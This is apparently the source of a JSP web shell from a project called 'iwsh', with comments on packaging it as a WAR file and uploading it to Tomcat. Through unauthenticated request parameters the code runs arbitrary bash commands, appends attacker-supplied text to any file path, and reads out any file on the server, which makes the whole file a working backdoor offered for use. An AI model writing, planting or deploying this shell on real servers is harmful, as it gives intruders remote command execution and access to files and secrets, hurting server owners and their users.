<%@ page import="java.util.*,java.io.*"%>

<%/*
*   Created by NumquamScire for iwsh project.
*   For tomcat: 'zip -r web_app.war iwsh.jsp'
*       Upload web_app.war
*       Access to full interactive web shell use client iwsh.sh -u http://localhost/web_app/iwsh.jsp -d 
*/%>

<%
if (request.getParameter("o") != null || request.getParameter("i") != null || request.getParameter("c") != null || request.getParameter("fi") != null) {

    if (request.getParameter("i") != null) {
        String fi="/tmp/i";
        if (request.getParameter("fi") != null) {
            fi=request.getParameter("fi");
        } 
        java.io.BufferedWriter writer = new java.io.BufferedWriter(new java.io.FileWriter(fi, true));
        writer.write(request.getParameter("i"));
        writer.close();
    }
    if (request.getParameter("c") != null) { 
            String[] commandArray = { "/bin/bash", "-c", request.getParameter("c") };
            ProcessBuilder processBuilder = new ProcessBuilder(commandArray);
            Process process = processBuilder.start();
            
            // Capture the output
            InputStream inputStream = process.getInputStream();
            InputStreamReader inputStreamReader = new InputStreamReader(inputStream);
            BufferedReader reader = new BufferedReader(inputStreamReader);

            String line;
            while ((line = reader.readLine()) != null) {
                out.println(line.trim());
            }

            // Wait for the process to complete
            int exitCode = process.waitFor();
        }
        if (request.getParameter("o") != null) {
            BufferedReader reader = new BufferedReader(new FileReader(request.getParameter("o")));
            char[] buffer = new char[1024];
            int bytesRead;

            while ((bytesRead = reader.read(buffer)) != -1) {
                out.print(new String(buffer, 0, bytesRead));
                out.flush();
                Thread.sleep(100); 
            }

        }
        return;
}
%>



